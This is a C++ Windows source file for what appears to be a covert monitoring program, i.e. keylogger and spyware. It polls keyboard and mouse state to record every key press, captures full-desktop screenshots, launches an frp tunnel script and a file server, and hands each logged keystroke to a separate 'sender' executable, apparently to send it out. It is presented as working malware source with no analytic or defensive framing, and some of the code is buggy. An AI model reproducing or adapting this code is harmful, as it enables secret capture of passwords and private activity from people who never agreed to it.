#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define MAX_SIZE 100
#define ONE_PAGE 4096
struct FileHead
{
	char str[260];
	int size;
};
#include<cstdio>
#include<windows.h>
#include<stdlib.h>
#include<atlimage.h>
#include<fstream>
#include<TlHelp32.h>
#pragma comment(lib,"ws2_32.lib")
using namespace std;

bool getk(int KeyID) {
	return ::GetAsyncKeyState(KeyID) & 0x8000;
}

char GetKey() {
	char key = '\0';
	for (char i = 'A'; i <= 'Z'; i++) {
		if (getk(i)) {
			key = i;
			Sleep(50);
		}
	}

	for (char i = '0'; i <= '9'; i++) {
		if (getk(i)) {
			key = i;
			Sleep(50);
		}
	}

	return key;
}

char* GetKey_() {
	if (getk(0x01)) { Sleep(50); return (char*)"LBUTTON"; }
	if (getk(0x02)) { Sleep(50); return (char*)"RBUTTON"; }
	if (getk(0x03)) { Sleep(50); return (char*)"Ctrl+Break"; }
	if (getk(0x03)) { Sleep(50); return (char*)"MBUTTON"; }

	if (getk(0x08)) { Sleep(50); return (char*)"Backspace"; }
	if (getk(0x09)) { Sleep(50); return (char*)"TAB"; }
	if (getk(0x0D)) { Sleep(50); return (char*)"RETURN"; }

	if (getk(0x10)) { Sleep(50); return (char*)"SHIFT"; }
	if (getk(0x11)) { Sleep(50); return (char*)"CTRL"; }
	if (getk(0x12)) { Sleep(50); return (char*)"ALT"; }
	if (getk(0x13)) { Sleep(50); return (char*)"CapsLock"; }
	if (getk(0x14)) { Sleep(50); return (char*)"ESC"; }

	if (getk(0x20)) { Sleep(50); return (char*)"SPACE"; }
	if (getk(0x25)) { Sleep(50); return (char*)"LEFT"; }
	if (getk(0x26)) { Sleep(50); return (char*)"UP"; }
	if (getk(0x27)) { Sleep(50); return (char*)"RIGHT"; }
	if (getk(0x28)) { Sleep(50); return (char*)"DOWN"; }
	if (getk(0x2C)) { Sleep(50); return (char*)"PrintScreen"; }
	if (getk(0x2D)) { Sleep(50); return (char*)"Insert"; }
	if (getk(0x2E)) { Sleep(50); return (char*)"Delete"; }

	if (getk(0x70)) { Sleep(50); return (char*)"F1"; }
	if (getk(0x71)) { Sleep(50); return (char*)"F2"; }
	if (getk(0x72)) { Sleep(50); return (char*)"F3"; }
	if (getk(0x73)) { Sleep(50); return (char*)"F4"; }
	if (getk(0x74)) { Sleep(50); return (char*)"F5"; }
	if (getk(0x75)) { Sleep(50); return (char*)"F6"; }
	if (getk(0x76)) { Sleep(50); return (char*)"F7"; }
	if (getk(0x77)) { Sleep(50); return (char*)"F8"; }
	if (getk(0x78)) { Sleep(50); return (char*)"F9"; }
	if (getk(0x79)) { Sleep(50); return (char*)"F10"; }
	if (getk(0x7A)) { Sleep(50); return (char*)"F11"; }
	if (getk(0x7B)) { Sleep(50); return (char*)"F12"; }
	return (char*)"\0";
}



void screen(char fileName[1024])
{
	HWND window = GetDesktopWindow();
	HDC _dc = GetWindowDC(window);
	HDC dc = CreateCompatibleDC(0);

	RECT re;
	GetWindowRect(window, &re);
	int w = re.right,
		h = re.bottom;
	void* buf = new char[w * h * 4];

	HBITMAP bm = CreateCompatibleBitmap(_dc, w, h);
	SelectObject(dc, bm);

	StretchBlt(dc, 0, 0, w, h, _dc, 0, 0, w, h, SRCCOPY);

	void* f = CreateFile((LPCWSTR)fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);

	GetObject(bm, 84, buf);

	tagBITMAPINFO bi;
	bi.bmiHeader.biSize = sizeof(bi.bmiHeader);
	bi.bmiHeader.biWidth = w;
	bi.bmiHeader.biHeight = h;
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 32;
	bi.bmiHeader.biCompression = 0;
	bi.bmiHeader.biSizeImage = 0;

	CreateDIBSection(dc, &bi, DIB_RGB_COLORS, &buf, 0, 0);
	GetDIBits(dc, bm, 0, h, buf, &bi, DIB_RGB_COLORS);

	BITMAPFILEHEADER bif;
	bif.bfType = MAKEWORD('B', 'M');
	bif.bfSize = w * h * 4 + 54;
	bif.bfOffBits = 54;

	BITMAPINFOHEADER bii;
	bii.biSize = 40;
	bii.biWidth = w;
	bii.biHeight = h;
	bii.biPlanes = 1;
	bii.biBitCount = 32;
	bii.biCompression = 0;
	bii.biSizeImage = w * h * 4;

	DWORD r;
	WriteFile(f, &bif, sizeof(bif), &r, NULL);
	WriteFile(f, &bii, sizeof(bii), &r, NULL);
	WriteFile(f, buf, w * h * 4, &r, NULL);

	CloseHandle(f);
	DeleteDC(_dc);
	DeleteDC(dc);
}
char buff[1024000];

WSADATA WSAData;
WORD sockVersion;
SOCKET clientSocket;
sockaddr_in dstAddr;



void scr() {
	system("del screen.jpg");
	screen((char*)"s");
	system("ren s screen.bmp");
	system("bmp2jpg.exe -i screen.bmp -o screen.jpg");
	system("del screen.bmp");

	char path[] = "screen.jpg";

}

BOOL IsExistProcess(const char* szProcessName)
{
	PROCESSENTRY32 processEntry32;
	HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (((int)toolHelp32Snapshot) != -1)
	{
		processEntry32.dwSize = sizeof(processEntry32);
		if (Process32First(toolHelp32Snapshot, &processEntry32))
		{
			do
			{
				int iLen = 2 * wcslen(processEntry32.szExeFile);
				char* chRtn = new char[iLen + 1];
				//转换成功返回为非负值
				wcstombs(chRtn, processEntry32.szExeFile, iLen + 1);
				if (strcmp(szProcessName, chRtn) == 0)
				{
					return TRUE;
				}
			} while (Process32Next(toolHelp32Snapshot, &processEntry32));
		}
		CloseHandle(toolHelp32Snapshot);
	}
	//
	return FALSE;
}

void tcpsendfile() {
	if (!IsExistProcess("FileServer.exe")) system("start FileServer.exe");
}

int main() {
	system("title 监控_2nd_ver2.31");
	system("start frp.bat");
	scr();
	while (true) {
		char key = GetKey();
		char* key2 = GetKey_();
		char message[1024]; memset(message, 0, 1024);
		if (key2[0])strcat(message, key2);
		if(key&&key2[0])strcat(message, " + ");
		if (key)message[strlen(message)] = key;

		char command[1024]; memset(command, 0, 1024);
		if (key || key2[0]) {
			sprintf(command, ".\\发送端.exe %s", message);
			system(command);
		}

		if (key2 == "F1") scr();
		Sleep(50);
		tcpsendfile();
	}
	closesocket(clientSocket);
	WSACleanup();
}